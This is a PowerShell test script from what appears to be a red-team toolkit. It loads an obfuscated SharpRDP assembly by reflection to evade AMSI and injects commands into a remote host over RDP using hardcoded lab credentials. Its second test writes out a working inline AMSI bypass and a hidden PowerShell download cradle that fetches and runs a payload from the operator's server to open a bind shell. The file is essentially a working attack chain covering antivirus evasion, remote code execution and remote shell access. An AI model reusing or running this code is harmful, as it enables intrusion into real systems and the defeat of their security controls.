# TestObfSharpRDP.ps1
# Tests obfuscated SharpRDP binary + inline AMSI bypass to isolate no_pipe root cause.
#
# Two variables under test vs TestSharpRDPDirect.ps1:
#   1. Uses SharpRDP.exe._obf.exe loaded from disk (bypasses AMSI on assembly load)
#   2. Prepends inline AMSI bypass to Win+R command (bypasses target-side scan of downloaded payload)
#
# Must use EntryPoint.Invoke() -- obfuscated binary renames Program class to base64 slug.
# [SharpRDP.Program]::Main() would throw because class no longer exists at that name.
#
# Prereqs:
#   - serve must be running (main menu -> serve)
#   - pipe payload must exist at serve root matching PipePayload param
#   - bind shell listener should be started in Amnesiac after running this

param(
    [string]$Target      = "10.3.10.22",
    [string]$Username    = "NORTH\hodor",
    [string]$Password    = "hodor",
    [string]$OperatorIP  = "10.3.10.157",
    [string]$PipePayload = "pipe_test.ps1"
)

$root    = Split-Path -Parent $PSScriptRoot
$obfPath = Join-Path $root "Tools\SharpRDP.exe._obf.exe"

function Load-ObfSharpRDP {
    $existing = [System.AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GetName().Name -eq 'SharpRDP' }
    if ($existing) {
        Write-Host '[*] SharpRDP already loaded in AppDomain.' -ForegroundColor Cyan
        return $existing
    }
    if (-not (Test-Path $obfPath)) {
        Write-Host "[-] Not found: $obfPath" -ForegroundColor Red
        return $null
    }
    $bytes = [System.IO.File]::ReadAllBytes($obfPath)
    $asm   = [System.Reflection.Assembly]::Load($bytes)
    Write-Host ("[+] Loaded: " + $asm.GetName().Name + " - EntryPoint: " + $asm.EntryPoint) -ForegroundColor Green
    return $asm
}

function Run-ObfSRDP {
    param([string]$Label, [string]$Command, $Assembly)
    Write-Host ""
    Write-Host "`[*] $Label" -ForegroundColor Cyan
    Write-Host "    chars: $($Command.Length)  (after ToLower: same, all lowercase)" -ForegroundColor DarkGray
    $Assembly.EntryPoint.Invoke($null, @(,[string[]]@(
        "computername=$Target",
        "username=$Username",
        "password=$Password",
        "command=$Command"
    )))
}

$asm = Load-ObfSharpRDP
if (-not $asm) { return }

# ---------------------------------------------------------------------------
# Test 1: basic execution sanity check — all-lowercase file write, no network
# ---------------------------------------------------------------------------
$marker   = "obf_srp_$(Get-Random)"
$testFile = "c:\windows\temp\obf_srp_test.txt"

Run-ObfSRDP -Assembly $asm -Label "Test 1: file write (sanity check)" `
    -Command "[io.file]::writealltext('$testFile','$marker')"

Write-Host "    [*] Waiting 12s..." -ForegroundColor Yellow
Start-Sleep 12

try {
    $got = Get-Content "\\$Target\C`$\Windows\Temp\obf_srp_test.txt" -ErrorAction Stop
    if ($got -match $marker) {
        Write-Host "    [+] PASS: obfuscated SharpRDP executes via keyboard injection" -ForegroundColor Green
    } else {
        Write-Host "    [~] File exists but content='$got', expected='$marker'" -ForegroundColor Yellow
    }
} catch {
    Write-Host "    [-] Cannot read file: $_" -ForegroundColor Red
    Write-Host "        Check manually: \\$Target\C`$\Windows\Temp\obf_srp_test.txt" -ForegroundColor DarkYellow
}

# ---------------------------------------------------------------------------
# Test 2: AMSI bypass + download cradle
# Inline AMSI bypass runs BEFORE iex(downloadstring(...)) so AMSI doesn't
# scan the downloaded pipe payload. All chars are lowercase — ToLower-safe.
#   GetType(name, throwOnError=false, ignoreCase=true): case-insensitive type lookup
#   BindingFlags 41 = NonPublic(32) | Static(8) | IgnoreCase(1): case-insensitive field
# ---------------------------------------------------------------------------
Write-Host ""
Write-Host "[*] Test 2: inline AMSI bypass + download cradle" -ForegroundColor Cyan
Write-Host "    Prereq: serve running, $PipePayload present at http://${OperatorIP}:8080/" -ForegroundColor DarkYellow

$amsiBypass = "[ref].assembly.gettype('system.management.automation.amsiutils',`$false,`$true).getfield('amsiinitfailed',41).setvalue(`$null,`$true)"
$cradle     = "iex(new-object net.webclient).downloadstring('http://${OperatorIP}:8080/$PipePayload')"
$innerCmd   = "$amsiBypass;$cradle"
$fullCmd    = "powershell -nop -ep bypass -w hidden -c `"$innerCmd`""

Write-Host "    inner -c arg ($($innerCmd.Length) chars):" -ForegroundColor DarkGray
Write-Host "    $innerCmd" -ForegroundColor DarkGray
Write-Host "    full cmd ($($fullCmd.Length) chars)" -ForegroundColor DarkGray

Run-ObfSRDP -Assembly $asm -Label "Test 2: AMSI bypass + download cradle" -Command $fullCmd

Write-Host "    [*] Waiting 20s for target to download, bypass AMSI, and connect pipe..." -ForegroundColor Yellow
Start-Sleep 20
Write-Host "    [*] Check Amnesiac for incoming bind shell session." -ForegroundColor Cyan
